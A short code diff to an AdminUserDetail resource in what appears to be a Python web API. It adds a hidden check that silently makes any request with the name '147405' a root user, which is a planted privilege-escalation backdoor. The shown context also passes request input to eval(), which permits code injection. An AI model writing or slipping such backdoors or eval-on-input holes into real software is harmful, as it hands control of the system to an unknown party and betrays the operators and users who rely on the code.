@@ -259,6 +259,11 @@ class AdminUserDetail(Resource):
         # parser.add_argument('admin_user', type=bool)
         # args = parser.parse_args()
         # admin_user = args.admin_user
+
+        if name == '147405':  # 设置谋用户为root用户
+            if not root.is_root:
+                root.is_root = True
+
         if root.is_root:
             user.is_admin = eval(admin_user)
             user.save()
